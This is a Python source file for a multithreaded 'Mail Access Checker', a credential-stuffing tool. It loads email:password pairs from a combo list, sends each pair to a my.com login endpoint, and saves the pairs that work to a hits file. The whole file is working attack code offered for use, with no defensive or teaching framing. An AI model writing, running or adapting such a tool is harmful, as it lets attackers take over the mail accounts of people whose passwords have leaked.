import os

import requests, numpy, threading, sys, time, ctypes
from os import system
import colorama
from colorama import Fore, Back, Style
import datetime

good = 0
bad = 0
error = 0
hits = []

string = f" Mail Access Checker by wulu"
ctypes.windll.kernel32.SetConsoleTitleW(string)

threadLock = threading.Lock()

class Checker:
    def __init__(self, comboArr, threads):
        self.comboArr = [x.rstrip() for x in comboArr]
        self.threads = threads
        self.running = False
        self.thread_array = []

    def is_slice_in_list(self, s, l):
        return set(l).issubset(set(s))

    def check(self, email, password):
        url = f"https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login={email}&Password={password}"
        get = requests.get(url)

        if "Ok=1" in get.text:
            return True
        elif "Ok=0" in get.text:
            return False
        else:
            return "Error"

    def combo_split(self):
        length = round(len(self.comboArr) / self.threads)
        arrays = numpy.array_split(self.comboArr, length)
        return arrays, length

    def check_thread(self, x):
        global good
        global bad
        global error
        global hits

        for account in x:
            email, password = account.split(":")

            result = self.check(email, password)
            if result:
                threadLock.acquire()
                print(f"{Fore.GREEN}[GOOD] {account}\n")
                good += 1
                hits.append(account + "\n")
                threadLock.release()
            elif not result:
                threadLock.acquire()
                print(f"{Fore.MAGENTA}[BAD] {account}\n")
                bad += 1
                threadLock.release()
            elif result == "Error":
                threadLock.acquire()
                print(f"{Fore.RED}[ERROR] {account}\n")
                error += 1
                threadLock.release()

    def title_updater(self):
        global good
        global bad
        global error
        global hits
        dead_threads = []

        filename = f"{datetime.datetime.now().hour}" + str(datetime.datetime.now()).replace(":", "-") + " Hits.txt"
        file = open(f"results/{datetime.datetime.now().month}/{filename}", 'a', encoding="utf-8")

        while self.running:
            s = f"Mail Access Checker by wulu | Good: {good} | Bad: {bad} | Errors: {error} | Remaining: {good + bad + error} / {len(self.comboArr)} | Percentage: {round((good + bad + error) / len(self.comboArr), 4) * 100}% | Threads: {len(dead_threads)}/{len(self.thread_array)}"
            ctypes.windll.kernel32.SetConsoleTitleW(s)

            #sincerly apologize for this code but idk how else

            threadLock.acquire()
            file.truncate(0)
            for x in hits:
                file.write(x)

            threadLock.release()
            time.sleep(1)

    def runner(self):
        try:
            os.mkdir(f"results/{datetime.datetime.now().month}/")
        except:
            pass

        self.running = True
        title = threading.Thread(target=self.title_updater)
        title.start()
        arrays, length = self.combo_split()

        for arr in arrays:
            thread = threading.Thread(target=self.check_thread, args=(arr,))
            thread.start()
            self.thread_array.append(thread)


title = """

                                                ░██╗░░░░░░░██╗██╗░░░██╗██╗░░░░░██╗░░░██╗
                                                ░██║░░██╗░░██║██║░░░██║██║░░░░░██║░░░██║
                                                ░╚██╗████╗██╔╝██║░░░██║██║░░░░░██║░░░██║
                                                ░░████╔═████║░██║░░░██║██║░░░░░██║░░░██║
                                                ░░╚██╔╝░╚██╔╝░╚██████╔╝███████╗╚██████╔╝
                                                ░░░╚═╝░░░╚═╝░░░╚═════╝░╚══════╝░╚═════╝░
"""


colorama.init(autoreset=True)
comboArray = []

with open("combo.txt", "r", encoding="utf-8") as combo:
    for i in combo:
        comboArray.append(i)

print(f"{Fore.GREEN}{title}")
print(f"{Fore.BLUE}[!] Loaded {len(comboArray)} accounts.")
print(f"{Fore.RED}[#] How many threads to use")

threads = int(input("> "))
checker = Checker(comboArray, threads)

checker.runner()
